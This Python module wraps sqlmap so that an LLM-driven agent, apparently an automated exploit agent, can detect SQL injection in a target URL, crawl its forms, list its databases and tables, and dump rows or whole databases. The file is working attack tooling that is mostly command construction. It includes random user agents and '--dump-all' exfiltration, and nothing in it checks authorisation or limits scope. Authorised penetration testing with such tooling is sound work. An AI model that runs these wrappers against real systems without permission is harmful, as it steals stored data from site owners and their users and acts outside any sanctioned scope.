"""sqlmap wrappers — detect, enumerate, dump.

Four ladders the LLM walks:
  1. detect   — confirm injectability (also crawls)
  2. dbs      — list databases
  3. tables   — list tables in a db
  4. dump     — exfiltrate rows (whole table or whole db)
"""

from __future__ import annotations

import tempfile

from .. import parsers
from ..config import TOOLS
from ..runner import run


def _binary() -> str:
    spec = TOOLS["sqlmap"]
    resolved = spec.resolve()
    if not resolved:
        raise RuntimeError("sqlmap not installed (apt install sqlmap)")
    return resolved


def _common_flags(output_dir: str) -> list[str]:
    return [
        "--batch",
        "--random-agent",
        "--threads", "5",
        "--output-dir", output_dir,
        "--disable-coloring",
        # Fail fast on unreachable targets — defaults stall ~2min on a single
        # timeout because of three 30s retries. 15s timeout × 1 retry = ~30s
        # ceiling for connection failures, instead of 90+ seconds.
        "--timeout", "15",
        "--retries", "1",
    ]


def _discovery_flags() -> list[str]:
    """Flags that let sqlmap auto-find the injection point even when the
    caller passes a base URL instead of the exact vulnerable endpoint.
    Every dbs/tables/dump call includes these so the exploit agent doesn't
    have to know the precise URL upfront."""
    return ["--crawl", "2", "--forms", "--smart"]


async def sqlmap_detect_impl(target: str, level: int = 2, risk: int = 2, crawl: int = 2) -> dict:
    """Crawl + detect SQLi across all parameters and forms."""
    out_dir = tempfile.mkdtemp(prefix="sqlmap-detect-")
    cmd = [
        _binary(),
        "-u", target,
        "--level", str(level),
        "--risk", str(risk),
        "--crawl", str(crawl),
        "--forms",
        "--smart",
        *_common_flags(out_dir),
    ]
    raw = await run(cmd, timeout=TOOLS["sqlmap"].default_timeout)
    return parsers.parse_sqlmap(raw, target, mode="detect")


async def sqlmap_dbs_impl(target: str, level: int = 2, risk: int = 2) -> dict:
    """List databases on the injectable target."""
    out_dir = tempfile.mkdtemp(prefix="sqlmap-dbs-")
    cmd = [
        _binary(),
        "-u", target,
        "--level", str(level),
        "--risk", str(risk),
        "--dbs",
        *_discovery_flags(),
        *_common_flags(out_dir),
    ]
    raw = await run(cmd, timeout=TOOLS["sqlmap"].default_timeout)
    return parsers.parse_sqlmap(raw, target, mode="dbs")


async def sqlmap_tables_impl(target: str, db: str = "", level: int = 2, risk: int = 2) -> dict:
    """List tables. Pass db="" for SQLite / single-DB engines (no -D flag)."""
    out_dir = tempfile.mkdtemp(prefix="sqlmap-tables-")
    cmd = [
        _binary(),
        "-u", target,
        "--level", str(level),
        "--risk", str(risk),
    ]
    if db:
        cmd += ["-D", db]
    cmd += [
        "--tables",
        *_discovery_flags(),
        *_common_flags(out_dir),
    ]
    raw = await run(cmd, timeout=TOOLS["sqlmap"].default_timeout)
    return parsers.parse_sqlmap(raw, target, mode="tables", extra={"db": db or None})


async def sqlmap_dump_impl(
    target: str,
    db: str | None = None,
    table: str | None = None,
    dump_all: bool = False,
    level: int = 2,
    risk: int = 2,
) -> dict:
    """Dump rows. Pass dump_all=True to dump everything (db OR table can be omitted)."""
    out_dir = tempfile.mkdtemp(prefix="sqlmap-dump-")
    cmd = [
        _binary(),
        "-u", target,
        "--level", str(level),
        "--risk", str(risk),
    ]
    if dump_all:
        cmd.append("--dump-all")
        cmd.append("--exclude-sysdbs")
    else:
        if db:
            cmd += ["-D", db]
        if table:
            cmd += ["-T", table]
        cmd.append("--dump")
    cmd += _discovery_flags()
    cmd += _common_flags(out_dir)
    raw = await run(cmd, timeout=TOOLS["sqlmap"].default_timeout)
    return parsers.parse_sqlmap(
        raw, target, mode="dump",
        extra={"db": db, "table": table, "dump_all": dump_all},
    )
